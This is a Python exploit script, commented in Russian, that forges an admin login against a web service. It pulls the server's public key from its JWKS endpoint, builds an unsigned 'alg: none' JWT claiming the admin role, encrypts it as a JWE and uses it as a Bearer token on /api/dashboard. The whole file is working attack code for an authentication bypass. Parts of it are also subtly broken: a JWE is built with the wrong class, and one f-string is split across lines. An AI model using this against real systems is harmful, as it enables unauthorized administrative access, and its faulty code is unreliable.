import json
import time
import base64
import requests
from jwcrypto import jwk, jwe
import sys

from jwt.utils import base64url_encode

TARGET = sys.argv[1]

# Шаг 1. Получение открытого ключа RSA из JWKS
print("[*] FETCHING JWKS ...")
resp = requests.get(f"{TARGET}/api/auth/jwks")
jwks_data = resp.json()
key_data = jwks_data['keys'][0]
pub_key = jwk.JWK(**key_data)
print(f"[+] Got RSA public key (kid: {key_data['kid']})")


# Шаг 2. Создайте простой JWT с утверждениями администратора
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


now = int(time.time())
header = base64url_encode(json.dumps({"alg": "none"}).encode())
payload = base64url_encode(json.dumps({
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}).encode())
plain_jwt = f"{header}.{payload}."
print(f"[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN")
# Шаг 3. Зашифруйте JWE с помощью открытого ключа RSA сервера
jwe_token = jwk.JWK(
    plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": key_data['kid'],
        "cty": "JWT"
    })
)
forged_token = jwe_token.serialize(compact=True)
print(f"[+] Forged JWE token created")
# Шаг 4. Доступ к защищенным конечным точкам
headers = {
    "Authorization": f"Bearer {forged_token}", }
print("\n[*] Accessing /api/dashboard...")
resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(f"[+] Status: {resp.status_code}")
data = resp.json()
print(f"[+] Authenticated as: {data['user']['username']} ({data['user']
['role']})")
print(f"[+] Token: {forged_token}")
